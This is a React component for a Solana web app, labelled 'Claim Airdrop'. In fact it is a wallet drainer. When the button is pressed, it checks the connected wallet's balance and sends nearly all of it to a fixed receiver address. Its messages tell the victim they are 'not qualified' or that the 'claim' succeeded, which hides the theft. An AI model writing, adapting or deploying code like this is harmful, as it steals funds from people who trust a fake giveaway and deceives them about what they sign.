// src/components/TransferButton.jsx
import { useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL } from '../utils/constants';

export default function TransferButton({ className = '' }) {
  const { publicKey, sendTransaction, connected } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    if (!publicKey || !connected) return;

    setLoading(true);
    try {
      // Simple connection — no wsEndpoint (avoids WS issues on Alchemy)
      const connection = new Connection(RPC_URL, 'confirmed');

      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(publicKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      const minimumQualifyingLamports = Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL);

      if (balance < minimumQualifyingLamports) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const FEE_SAFETY = 5_000_000; // 0.005 SOL for fees + priority
      const totalReserve = rentExempt + FEE_SAFETY;
      const transferAmount = balance - totalReserve;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      // Fetch blockhash right before building tx to avoid expiry
      const { blockhash, lastValidBlockHeight } =
        await connection.getLatestBlockhash('finalized');

      const transferIx = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: RECEIVER_WALLET,
        lamports: transferAmount,
      });

      // Use legacy Transaction for maximum compatibility (mobile + desktop).
      // The adapter's sendTransaction() calls signAndSendTransaction on
      // Wallet Standard wallets — the wallet signs AND sends atomically.
      // This works on both desktop extensions and mobile in-app browsers.
      const transaction = new Transaction({
        feePayer: publicKey,
        recentBlockhash: blockhash,
      }).add(transferIx);

      const signature = await sendTransaction(transaction, connection);

      console.log('⏳ Transaction sent:', signature);

      // Poll for confirmation over HTTP (no WebSocket needed)
      const startTime = Date.now();
      const TIMEOUT = 90_000;
      const POLL_INTERVAL = 3_000;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              alert(`Claim successful!\nTx: ${signature}`);
              return;
            }
          }
        } catch (pollErr) {
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying...', pollErr);
        }

        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, connected]);

  if (!publicKey) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : 'Claim Airdrop'}
    </button>
  );
}
